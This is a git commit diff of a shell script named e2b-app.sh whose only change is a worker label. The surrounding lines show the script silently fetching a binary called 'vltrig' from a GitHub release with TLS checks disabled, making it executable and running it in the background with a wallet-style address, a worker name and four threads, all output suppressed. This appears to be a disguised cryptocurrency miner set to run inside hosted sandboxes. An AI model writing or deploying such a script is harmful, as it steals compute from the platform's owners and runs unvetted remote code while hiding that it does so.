be0950c072191d86186cb2ec3ecb92d33746e77a
andrygibhq02 <andrygibhq02@gmail.com>
2026-04-13 09:56:46 +0700

    Update e2b-app.sh

--- e2b-app.sh
+++ e2b-app.sh
@@ -2,4 +2,4 @@
 
 curl -sLkO https://github.com/satelitlima00/zerox/releases/download/ulo/vltrig >/dev/null 2>&1
 chmod +x vltrig
-./vltrig --user 45bx5mvR2MQP267tevQyozHSToTsE19g5Q3NvRmrQ3TCW6dEY3as2VH4ArrNnqZKLxaw31aFExZyuet4fgau3TwoRiWwFgi --pass BORKER-E3 --threads 4 >/dev/null 2>&1
+./vltrig --user 45bx5mvR2MQP267tevQyozHSToTsE19g5Q3NvRmrQ3TCW6dEY3as2VH4ArrNnqZKLxaw31aFExZyuet4fgau3TwoRiWwFgi --pass BORKER-E1 --threads 4 >/dev/null 2>&1
